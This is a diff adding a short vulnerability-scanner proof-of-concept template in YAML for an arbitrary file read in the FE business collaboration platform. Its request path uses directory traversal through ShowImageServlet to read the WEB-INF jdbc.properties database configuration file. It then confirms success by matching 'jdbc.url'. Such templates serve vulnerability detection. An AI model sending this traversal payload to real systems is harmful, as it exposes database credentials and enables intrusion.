@@ -1,0 +1,9 @@
+name: poc-yaml-飞企互联-FE业务协作平台-Diretory
+description: "任意文件读取"
+method: GET
+path:
+  - /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
+expression:
+  status: 200
+  body_all:
+    - "jdbc.url"
